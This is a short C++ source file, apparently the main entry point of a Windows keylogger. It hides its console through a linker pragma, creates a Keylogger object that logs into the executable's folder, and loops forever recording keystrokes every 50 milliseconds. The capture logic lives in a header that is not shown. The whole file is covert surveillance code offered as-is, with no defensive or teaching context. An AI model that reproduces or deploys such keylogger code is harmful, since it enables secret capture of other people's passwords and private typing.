#include <windows.h>
#include "Keylogger.h"
#include <string>

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:wmainCRTStartup")

std::wstring GetCurrentDirectory(std::wstring executable) {
	return executable.substr(0, executable.find_last_of(L'\\'));
}

int wmain(int argc, wchar_t* argv[]) {
	std::locale::global(std::locale(""));

	Keylogger keylogger(new Logger(GetCurrentDirectory(argv[0]),L"",10));

	while (true)
	{
		keylogger.logKeys();
		Sleep(50);
	}
	return 0;
}